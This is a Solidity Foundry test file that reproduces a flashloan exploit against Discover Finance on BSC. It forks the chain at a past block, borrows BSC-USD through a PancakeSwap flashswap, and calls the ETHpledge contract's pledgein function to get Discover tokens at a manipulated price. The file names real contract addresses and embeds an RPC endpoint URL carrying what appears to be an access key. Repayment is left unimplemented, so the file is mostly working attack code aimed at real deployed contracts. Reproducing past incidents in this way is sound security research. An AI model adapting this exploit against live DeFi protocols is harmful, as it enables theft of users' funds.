// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./Interface.sol";

/*
Discover Finance Flashloan Exploit PoC

The exploit was due to swapping a large number of tokens from the BSC-USD/Discover Pancake Pair and later on further swap the BSC-USD to get large amount of Discover Tokens.

Steps

1. Borrow BSC-USD(19,800) via Flashswap
2. Transfer about 2000 BSC-USD to ETHpledge for 62,536 Discover Tokens
3. Pay back the flashloan and swap the Discover Tokens for BNB

forge test --contracts ./test/7_Discover.sol --match-contract DiscoverExploit -vv

*/
interface ETHpledge {
  function pledgein(address fatheraddr, uint256 amountt)
    external
    returns (bool);
}

// Expected error. [FAIL. Reason: Pancake: INSUFFICIENT_INPUT_AMOUNT] 
// Because we don't repay funds to pancake.

contract DiscoverExploit is DSTest {
//   IPancakePair PancakePair =
//     IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00); // BSC-USD/BUSD Pancake Pair
  IPancakePair PancakePair2 =
    IPancakePair(0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d); // BSC-USD/Discover Pancake Pair
  IERC20 busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
  IERC20 discover = IERC20(0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267);
  ETHpledge ethpledge = ETHpledge(0xe732a7bD6706CBD6834B300D7c56a8D2096723A7);
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

  constructor() {
    cheats.createSelectFork("https://divine-black-wind.bsc.discover.quiknode.pro/64ab050694137dfcbf4c20daec2e94dc515c1d60", 18446845); // fork bsc at block 18446845

    busd.approve(address(ethpledge), type(uint256).max);
    discover.approve(address(ethpledge), type(uint256).max);
  }

  function testExploit() public {
    bytes memory data = abi.encode(address(this), 19810777285664651588959);
    emit log_named_uint(
      "Before flashswap, BUSD balance of attacker:",
      busd.balanceOf(address(this))
    );
    emit log_named_uint(
      "Before flashswap, discover balance of attacker:",
      discover.balanceOf(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930)
    ); 

    //init flashswap
    PancakePair2.swap(19810777285664651588959, 0, address(this), data);
  }

  function pancakeCall(
    address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
  ) public {
    emit log_named_uint(
      "After flashswap, BUSD balance of attacker:",
      busd.balanceOf(address(this))
    );
    
    //swap BSC-USD for Discover
    ethpledge.pledgein(
      0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930,
      2000000000000000000000
    );

    emit log_named_uint(
      "After Exploit, discover balance of attacker:",
      discover.balanceOf(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930)
    );
    
    //implement custom logic to payback the flashloan
  }

  receive() external payable {}
}